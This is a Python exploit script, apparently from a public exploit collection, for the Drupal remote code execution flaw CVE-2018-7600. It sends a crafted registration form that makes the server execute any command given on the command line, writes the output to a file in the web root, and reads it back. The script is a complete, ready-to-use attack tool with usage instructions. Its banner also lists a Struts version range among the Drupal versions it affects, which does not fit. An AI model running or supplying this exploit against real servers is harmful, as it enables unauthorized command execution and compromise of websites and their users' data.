#!/usr/bin/env python3
# coding:utf-8
import sys
import requests
import json

if len(sys.argv)!=3:
    print('+----------------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub                 +')
    print('+----------------------------------------------------------------------+')
    print('+ USE: python3 <filename> <url> <command>                              +')
    print('+ EXP: python3 cve-2018-7600_cmd.py http://1.1.1.1:8080 "ls -la"       +')
    print('+ VER: Drupal 6.x                                                      +')
    print('+      Drupal 7.x < 7.58                                               +')
    print('+      Drupal 8.3 < 8.3.9                                              +')
    print('+      Drupal 8.4 < 8.4.6                                              +')
    print('+      Drupal 8.5 < 8.5.1                                              +')
    print('+      Struts 2.5-2.5.10                                               +')
    print('+----------------------------------------------------------------------+')
    print('+ DES: json中仅能回显一行代码，多行代码结果查看http://xxxx/exphub.txt  +')
    print('+----------------------------------------------------------------------+')
    sys.exit()

url=sys.argv[1]
cmd=sys.argv[2]

proxies = {}
verify = True

target = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}

r = requests.post(target, proxies=proxies, data=payload, verify=verify)
page = r.text
text = json.loads(page)
json = json.dumps(text, sort_keys=True, indent=2)
print (json)

check = requests.get(url + '/exphub.txt', proxies=proxies, verify=verify)
if check.status_code != 200:
  sys.exit("[-] not cve-2018-7600")
print ('[+] '+url+'/exphub.txt')
